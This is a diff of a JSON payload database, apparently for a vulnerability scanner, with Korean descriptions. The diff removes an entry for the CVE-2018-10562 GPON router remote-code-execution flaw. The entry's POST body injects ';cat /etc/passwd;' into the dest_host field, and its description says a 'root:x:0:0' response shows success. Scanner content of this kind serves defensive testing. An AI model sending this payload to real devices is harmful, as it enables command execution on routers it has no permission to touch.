@@ -5034,29 +5034,6 @@
           }
         },
         {
-          "id": "cve_2018_10562_gpon_passwd",
-          "name": "CVE-2018-10562 GPON RCE — /etc/passwd 읽기(dest_host)",
-          "payload": "/GponForm/diag_Form?images/",
-          "description": "?images/ 인증 우회 후 dest_host 로 cat /etc/passwd 실행. 응답에 root:x:0:0 이 나오면 RCE 성공.",
-          "risk": "critical",
-          "cve": "CVE-2018-10562",
-          "location": "path",
-          "param": "",
-          "method": "POST",
-          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-10562",
-          "applies_to": {
-            "path_contains": [
-              "/GponForm/diag_Form",
-              "GponForm",
-              "diag_Form"
-            ]
-          },
-          "body": "XWebPageName=diag&diag_action=start&wan_conlist=0&dest_host=;cat /etc/passwd;&ipv=0",
-          "headers": {
-            "Content-Type": "application/x-www-form-urlencoded"
-          }
-        },
-        {
           "id": "nuclei_cve_2026_19478",
           "name": "CVE-2026-19478 GitLab CE/EE - GraphQL @gl_introduced Arbitrary Method Invocation",
           "payload": "/api/v4/projects?visibility=public&per_page=1",
